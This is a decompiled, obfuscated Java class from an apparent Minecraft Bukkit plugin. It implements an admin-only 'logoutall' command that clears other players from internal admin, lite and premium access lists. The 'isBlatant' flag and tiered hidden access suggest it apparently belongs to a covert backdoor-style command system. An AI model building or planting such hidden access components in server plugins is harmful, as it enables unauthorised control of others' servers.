/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class LogoutallCommand
extends Command {
    public LogoutallCommand() {
        LogoutallCommand lllllllllllllIlIlIlIIlIllllllIII;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllIlIlIlIIlIllllIIllI, String lllllllllllllIlIlIlIIlIllllIlIIl, String[] lllllllllllllIlIlIlIIlIllllIlIII, Player lllllllllllllIlIlIlIIlIllllIIlll) {
        if (lllllllllllllIlIlIlIIlIllllIIllI.admin.contains(lllllllllllllIlIlIlIIlIllllIIlll.getName())) {
            for (Player lllllllllllllIlIlIlIIlIllllIllII : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllIlIlIlIIlIllllIllII.getName().equals(lllllllllllllIlIlIlIIlIllllIIlll.getName()) || !lllllllllllllIlIlIlIIlIllllIIllI.lite.contains(lllllllllllllIlIlIlIIlIllllIllII.getName())) continue;
                lllllllllllllIlIlIlIIlIllllIIllI.lite.remove(lllllllllllllIlIlIlIIlIllllIllII.getName());
                lllllllllllllIlIlIlIIlIllllIIllI.admin.remove(lllllllllllllIlIlIlIIlIllllIllII.getName());
                lllllllllllllIlIlIlIIlIllllIIllI.premium.remove(lllllllllllllIlIlIlIIlIllllIllII.getName());
            }
            lllllllllllllIlIlIlIIlIllllIIlll.sendMessage(Settings.PREFIX("All users have been logged out!"));
        } else {
            lllllllllllllIlIlIlIIlIllllIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append("to execute this command"))));
        }
    }
}

